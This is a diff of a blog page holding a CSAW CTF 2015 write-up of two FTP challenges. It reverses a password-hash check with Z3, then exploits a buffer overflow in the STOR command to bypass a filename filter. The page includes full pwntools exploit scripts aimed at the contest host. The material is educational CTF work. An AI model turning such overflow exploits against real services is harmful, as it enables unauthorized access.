@@ -305,30 +305,30 @@
 <!-- more -->
 
 <h1 id="ftp">FTP</h1>
-<p><a href="https://github.com/ctfs/write-ups-2015/blob/master/csaw-ctf-2015/reverse/ftp-300/ftp_0319deb1c1c033af28613c57da686aa7">64 bit ELF</a>. It’s a FTP-like service, we can list all the acceptable command by sending the <code class="highlighter-rouge">HELP</code> command. Here are some important commands that we’ll need to pass the challenges:<br />
-<code class="highlighter-rouge">USER [username]</code>: enter username to login
-<code class="highlighter-rouge">PASS [password]</code>: enter password after sending the <code class="highlighter-rouge">USER</code> command to login as the <code class="highlighter-rouge">[username]</code>
-<code class="highlighter-rouge">PASV</code>: open a port for passive mode
-<code class="highlighter-rouge">LIST</code>: list the files in the directory
-<code class="highlighter-rouge">STOR</code>: upload a file
-<code class="highlighter-rouge">RETR</code>: download a file
-<code class="highlighter-rouge">RDF</code>: read the reversing solution’s flag</p>
+<p><a href="https://github.com/ctfs/write-ups-2015/blob/master/csaw-ctf-2015/reverse/ftp-300/ftp_0319deb1c1c033af28613c57da686aa7">64 bit ELF</a>. It’s a FTP-like service, we can list all the acceptable command by sending the <code class="language-plaintext highlighter-rouge">HELP</code> command. Here are some important commands that we’ll need to pass the challenges:<br />
+<code class="language-plaintext highlighter-rouge">USER [username]</code>: enter username to login
+<code class="language-plaintext highlighter-rouge">PASS [password]</code>: enter password after sending the <code class="language-plaintext highlighter-rouge">USER</code> command to login as the <code class="language-plaintext highlighter-rouge">[username]</code>
+<code class="language-plaintext highlighter-rouge">PASV</code>: open a port for passive mode
+<code class="language-plaintext highlighter-rouge">LIST</code>: list the files in the directory
+<code class="language-plaintext highlighter-rouge">STOR</code>: upload a file
+<code class="language-plaintext highlighter-rouge">RETR</code>: download a file
+<code class="language-plaintext highlighter-rouge">RDF</code>: read the reversing solution’s flag</p>
 
-<p>So after some static analysis with the help of IDA Pro, I figure out that in order to pass the reversing challenge, we’ll need to login as the user <code class="highlighter-rouge">blankwall</code>. The password checking function’s at <code class="highlighter-rouge">0x401540</code>, let’s take a look at it:</p>
+<p>So after some static analysis with the help of IDA Pro, I figure out that in order to pass the reversing challenge, we’ll need to login as the user <code class="language-plaintext highlighter-rouge">blankwall</code>. The password checking function’s at <code class="language-plaintext highlighter-rouge">0x401540</code>, let’s take a look at it:</p>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_401540</span><span class="p">(</span><span class="n">__int64</span> <span class="n">a1</span><span class="p">)</span>
 <span class="p">{</span>
-    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [sp+10h] [bp-8h]@1
-</span>    <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+14h] [bp-4h]@1
-</span>
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [sp+10h] [bp-8h]@1</span>
+    <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+14h] [bp-4h]@1</span>
+
     <span class="n">v3</span> <span class="o">=</span> <span class="mi">5381</span><span class="p">;</span>
     <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
         <span class="n">v3</span> <span class="o">=</span> <span class="mi">33</span> <span class="o">*</span> <span class="n">v3</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span>
     <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v3</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="o">-</span><span class="mi">746139127</span><span class="p">)</span> <span class="c1">// result should be 0xd386d209
-</span><span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="o">-</span><span class="mi">746139127</span><span class="p">)</span> <span class="c1">// result should be 0xd386d209</span>
+<span class="p">{</span>
     <span class="n">login_bit</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
     <span class="n">dword_604408</span> <span class="o">=</span> <span class="sc">'f'</span><span class="p">;</span>
 <span class="p">}</span>
@@ -336,7 +336,7 @@
 
 <p>At first I was like “Ah, that’s easy!”, since we have the constraint system, we can just set it up and leave the rest to Z3. But after I have the solution and enter the password, the service respond it with a frustrating <strong>“Invalid login credentials”</strong>. Knowing that Hex-Rays’ decompiler might have the incorrect decompiling result, I re-check the password checking logic by reversing directly from the x64 assembly, not the pseudo code, and finally found the root of the problem:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov     eax, [rbp+var_4] ; v3, with 0x1505 as the initial value
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov     eax, [rbp+var_4] ; v3, with 0x1505 as the initial value
 shl     eax, 5
 mov     edx, eax         ; rdx = (v3 &lt;&lt; 5) &amp; 0xFFFFFFFF
 mov     eax, [rbp+var_4] ; now rax = ((v3 &lt;&lt; 5) &amp; 0xFFFFFFFF00000000) | (v3 &amp; 0xFFFFFFFF)
@@ -351,14 +351,14 @@ add     eax, ecx ;
 mov     [rbp+var_4], eax ; v3 = ecx + eax
 </code></pre></div></div>
 
-<p>What really matters is the assembly <code class="highlighter-rouge">eax, [rbp+var_4]</code> at line 4. Notice that when the program move <code class="highlighter-rouge">v3</code> to the register <code class="highlighter-rouge">eax</code>, <strong>it doesn’t clear the highest 32 bits of the register <code class="highlighter-rouge">rax</code></strong>. So when it runs to the line <code class="highlighter-rouge">ecx, [rdx+rax]</code>, <code class="highlighter-rouge">rax</code> isn’t just simply <code class="highlighter-rouge">v3 &amp; 0xFFFFFFFF</code>, it’s actually:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>((v3 &lt;&lt; 5) &amp; 0xFFFFFFFF00000000) | (v3 &amp; 0xFFFFFFFF)
+<p>What really matters is the assembly <code class="language-plaintext highlighter-rouge">eax, [rbp+var_4]</code> at line 4. Notice that when the program move <code class="language-plaintext highlighter-rouge">v3</code> to the register <code class="language-plaintext highlighter-rouge">eax</code>, <strong>it doesn’t clear the highest 32 bits of the register <code class="language-plaintext highlighter-rouge">rax</code></strong>. So when it runs to the line <code class="language-plaintext highlighter-rouge">ecx, [rdx+rax]</code>, <code class="language-plaintext highlighter-rouge">rax</code> isn’t just simply <code class="language-plaintext highlighter-rouge">v3 &amp; 0xFFFFFFFF</code>, it’s actually:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>((v3 &lt;&lt; 5) &amp; 0xFFFFFFFF00000000) | (v3 &amp; 0xFFFFFFFF)
 </code></pre></div></div>
 <p>and that’s where the Hex-Rays decompiler made the mistake.</p>
 
 <p>So now we have the correct constraint system. Wrote a Z3 python script and retrieve the password:</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
 <span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 
@@ -398,7 +398,7 @@ mov     [rbp+var_4], eax ; v3 = ecx + eax
 </code></pre></div></div>
 
 <p>Since I don’t know the password length, I just brute force it from 1 ~ 10. We can found a solution at length 6:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>trying size: 0
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>trying size: 0
 unsat
 trying size: 1
 unsat
@@ -421,30 +421,30 @@ trying size: 6
 
 <p>Now we get the login password, time to capture the flag :)</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">subprocess</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">import</span> <span class="nn">time</span>
 
-<span class="c">#HOST = "localhost"</span>
-<span class="n">HOST</span> <span class="o">=</span> <span class="s">"54.175.183.202"</span>
+<span class="c1">#HOST = "localhost"
+</span><span class="n">HOST</span> <span class="o">=</span> <span class="s">"54.175.183.202"</span>
 <span class="n">PORT</span> <span class="o">=</span> <span class="mi">12012</span>
 <span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">""</span>
 <span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>
 
-<span class="c"># setting </span>
-<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
-<span class="c">#context.arch = 'i386'</span>
-<span class="c">#context.arch = 'arm'</span>
-<span class="c">#context.arch = 'aarch64'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="c1"># setting 
+</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="c1">#context.arch = 'i386'
+#context.arch = 'arm'
+#context.arch = 'aarch64'
+</span><span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
-<span class="c">#elf = ELF(ELF_PATH)</span>
-<span class="c">#libc = ELF(LIBC_PATH)</span>
-
+<span class="c1">#elf = ELF(ELF_PATH)
+#libc = ELF(LIBC_PATH)
+</span>
 <span class="k">def</span> <span class="nf">my_recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">delim</span><span class="p">):</span>
     <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
     <span class="k">while</span> <span class="n">delim</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
@@ -463,25 +463,25 @@ trying size: 6
     <span class="n">password</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">password</span><span class="p">)</span>
 
     <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
-    <span class="c">#r = process(ELF_PATH)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"server</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="c1">#r = process(ELF_PATH)
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"server</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
     <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"USER blankwall"</span><span class="p">)</span>
     <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"blankwall</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
     <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"PASS "</span><span class="o">+</span><span class="n">password</span><span class="p">)</span>
     <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"in</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"RDF"</span><span class="p">)</span> <span class="c"># read the flag</span>
-
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"RDF"</span><span class="p">)</span> <span class="c1"># read the flag
+</span>
     <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
-<p>The flag is: <code class="highlighter-rouge">flag{n0_c0ok1e_ju$t_a_f1ag_f0r_you}</code></p>
+<p>The flag is: <code class="language-plaintext highlighter-rouge">flag{n0_c0ok1e_ju$t_a_f1ag_f0r_you}</code></p>
 
 <h1 id="ftp2">FTP2</h1>
-<p>So now we’re logged in as a valid user, we can finally do some other stuff. After sending <code class="highlighter-rouge">PASV</code> and the <code class="highlighter-rouge">LIST</code> command, I found that there’s a <code class="highlighter-rouge">flag.txt</code> in the directory. At first I try to download the file, but the service response <strong>“Invalid character specified”</strong>. Well that’s strange :/ so I went to the <code class="highlighter-rouge">RETR</code> function and start analyzing.</p>
+<p>So now we’re logged in as a valid user, we can finally do some other stuff. After sending <code class="language-plaintext highlighter-rouge">PASV</code> and the <code class="language-plaintext highlighter-rouge">LIST</code> command, I found that there’s a <code class="language-plaintext highlighter-rouge">flag.txt</code> in the directory. At first I try to download the file, but the service response <strong>“Invalid character specified”</strong>. Well that’s strange :/ so I went to the <code class="language-plaintext highlighter-rouge">RETR</code> function and start analyzing.</p>
 
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="n">filename</span><span class="p">;</span> <span class="c1">//[bp - 0x30]
-</span><span class="n">v7</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span> <span class="c1">//[bp - 0x28]
-</span><span class="k">while</span> <span class="p">(</span> <span class="o">*</span><span class="n">s</span> <span class="o">!=</span> <span class="n">dword_604408</span> <span class="p">)</span>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="n">filename</span><span class="p">;</span> <span class="c1">//[bp - 0x30]</span>
+<span class="n">v7</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span> <span class="c1">//[bp - 0x28]</span>
+<span class="k">while</span> <span class="p">(</span> <span class="o">*</span><span class="n">s</span> <span class="o">!=</span> <span class="n">dword_604408</span> <span class="p">)</span>
 <span class="p">{</span>
     <span class="o">--</span><span class="n">v7</span><span class="p">;</span>
     <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v7</span> <span class="p">)</span>
@@ -494,14 +494,14 @@ trying size: 6
 <span class="p">}</span>
 </code></pre></div></div>
 
-<p>So…to sum it up, the program will detect whether if the filename has the character store in <code class="highlighter-rouge">0x604408</code>, and if it does, it will refuse to let us download the file. Remeber the function that does the password checking?</p>
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="o">-</span><span class="mi">746139127</span><span class="p">)</span> <span class="c1">// result should be 0xd386d209
-</span><span class="p">{</span>
+<p>So…to sum it up, the program will detect whether if the filename has the character store in <code class="language-plaintext highlighter-rouge">0x604408</code>, and if it does, it will refuse to let us download the file. Remeber the function that does the password checking?</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="o">-</span><span class="mi">746139127</span><span class="p">)</span> <span class="c1">// result should be 0xd386d209</span>
+<span class="p">{</span>
     <span class="n">login_bit</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-    <span class="n">dword_604408</span> <span class="o">=</span> <span class="sc">'f'</span><span class="p">;</span> <span class="c1">//LOL
-</span><span class="p">}</span>
+    <span class="n">dword_604408</span> <span class="o">=</span> <span class="sc">'f'</span><span class="p">;</span> <span class="c1">//LOL</span>
+<span class="p">}</span>
 </code></pre></div></div>
-<p>So apparently we can’t have <code class="highlighter-rouge">'f'</code> in our filename, we’ll need to find another way to bypass the filter. By checking other functions, I finally found a way to bypass it.</p>
+<p>So apparently we can’t have <code class="language-plaintext highlighter-rouge">'f'</code> in our filename, we’ll need to find another way to bypass the filter. By checking other functions, I finally found a way to bypass it.</p>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sub_4014F8</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="s">"transfer starting.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
 <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
@@ -518,40 +518,40 @@ trying size: 6
 
 <span class="n">LABEL_8</span><span class="o">:</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">"Storing file %s"</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">24</span><span class="p">));</span>
-    <span class="n">byte_604200</span><span class="p">[(</span><span class="kt">signed</span> <span class="n">__int64</span><span class="p">)(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v5</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// overflow vulnerability
-</span>    <span class="n">v3</span> <span class="o">=</span> <span class="n">dword_604404</span><span class="o">++</span><span class="p">;</span>
+    <span class="n">byte_604200</span><span class="p">[(</span><span class="kt">signed</span> <span class="n">__int64</span><span class="p">)(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v5</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// overflow vulnerability</span>
+    <span class="n">v3</span> <span class="o">=</span> <span class="n">dword_604404</span><span class="o">++</span><span class="p">;</span>
     <span class="n">LODWORD</span><span class="p">(</span><span class="n">v4</span><span class="p">)</span> <span class="o">=</span> <span class="n">sub_40139B</span><span class="p">(</span><span class="n">v7</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
     <span class="n">qword_604840</span><span class="p">[</span><span class="n">v3</span><span class="p">]</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
     <span class="n">sub_4014F8</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="s">"transfer complete</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
     <span class="n">result</span> <span class="o">=</span> <span class="n">sub_4023DF</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="mi">4207204LL</span><span class="p">);</span>
 </code></pre></div></div>
 
-<p>Here in the <code class="highlighter-rouge">STOR</code> function, <strong>if we upload a file that is big enough, we can overwrite the data at <code class="highlighter-rouge">0x604408</code></strong>. So it’s quite simple: just create a file that is larger than 512 bytes, then upload it to the server. After that, we can download the <code class="highlighter-rouge">flag.txt</code> and get the flag.</p>
+<p>Here in the <code class="language-plaintext highlighter-rouge">STOR</code> function, <strong>if we upload a file that is big enough, we can overwrite the data at <code class="language-plaintext highlighter-rouge">0x604408</code></strong>. So it’s quite simple: just create a file that is larger than 512 bytes, then upload it to the server. After that, we can download the <code class="language-plaintext highlighter-rouge">flag.txt</code> and get the flag.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">subprocess</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">import</span> <span class="nn">time</span>
 
-<span class="c">#HOST = "localhost"</span>
-<span class="n">HOST</span> <span class="o">=</span> <span class="s">"54.175.183.202"</span>
+<span class="c1">#HOST = "localhost"
+</span><span class="n">HOST</span> <span class="o">=</span> <span class="s">"54.175.183.202"</span>
 <span class="n">PORT</span> <span class="o">=</span> <span class="mi">12012</span>
 <span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">""</span>
 <span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>
 
-<span class="c"># setting </span>
-<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
-<span class="c">#context.arch = 'i386'</span>
-<span class="c">#context.arch = 'arm'</span>
-<span class="c">#context.arch = 'aarch64'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="c1"># setting 
+</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="c1">#context.arch = 'i386'
+#context.arch = 'arm'
+#context.arch = 'aarch64'
+</span><span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
-<span class="c">#elf = ELF(ELF_PATH)</span>
-<span class="c">#libc = ELF(LIBC_PATH)</span>
-
+<span class="c1">#elf = ELF(ELF_PATH)
+#libc = ELF(LIBC_PATH)
+</span>
 <span class="k">def</span> <span class="nf">my_recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">delim</span><span class="p">):</span>
     <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
     <span class="k">while</span> <span class="n">delim</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
@@ -580,14 +580,14 @@ trying size: 6
     <span class="n">password</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">password</span><span class="p">)</span>
 
     <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
-    <span class="c">#r = process(ELF_PATH)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"server</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"USER blankwall"</span><span class="p">)</span>
+    <span class="c1">#r = process(ELF_PATH)
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"server</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"USER blankwall"</span><span class="p">)</span>
     <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"blankwall</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"PASS "</span><span class="o">+</span><span class="n">password</span><span class="p">)</span>
     <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"in</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"login success"</span><span class="p">)</span>
 
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Sending dildo.txt..."</span><span class="p">)</span> <span class="c"># don't mind the filename LOL!</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlinethen</span><span class="p">(</span><span class="s">"port: "</span><span class="p">,</span> <span class="s">"PASV"</span><span class="p">)</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Sending dildo.txt..."</span><span class="p">)</span> <span class="c1"># don't mind the filename LOL!
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendlinethen</span><span class="p">(</span><span class="s">"port: "</span><span class="p">,</span> <span class="s">"PASV"</span><span class="p">)</span>
     <span class="n">pasv_port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
     <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"STOR dildo.txt"</span><span class="p">)</span>
     <span class="n">myexec</span><span class="p">(</span><span class="s">"cat dildo.txt | nc "</span><span class="o">+</span><span class="n">HOST</span><span class="o">+</span><span class="s">" "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">pasv_port</span><span class="p">))</span>
@@ -602,7 +602,7 @@ trying size: 6
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Get flag: "</span><span class="o">+</span><span class="n">flag</span><span class="p">)</span>
 </code></pre></div></div>
 
-<p>The flag is: <code class="highlighter-rouge">flag{exploiting_ftp_servers_in_2015}</code></p>
+<p>The flag is: <code class="language-plaintext highlighter-rouge">flag{exploiting_ftp_servers_in_2015}</code></p>
 
         
       </section>
@@ -711,7 +711,6 @@ trying size: 6
       <div class="grid__wrapper">
         
           
-          
 
 
 
@@ -731,7 +730,6 @@ trying size: 6
 
         
           
-          
 
 
 
@@ -750,7 +748,6 @@ trying size: 6
 </div>
 
         
-          
           
 
 
@@ -773,7 +770,6 @@ trying size: 6
 
         
           
-          
 
 
 
@@ -794,6 +790,7 @@ trying size: 6
         
       </div>
     </div>
+  
   
 </div>
 
@@ -844,7 +841,7 @@ trying size: 6
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2019 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2020 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
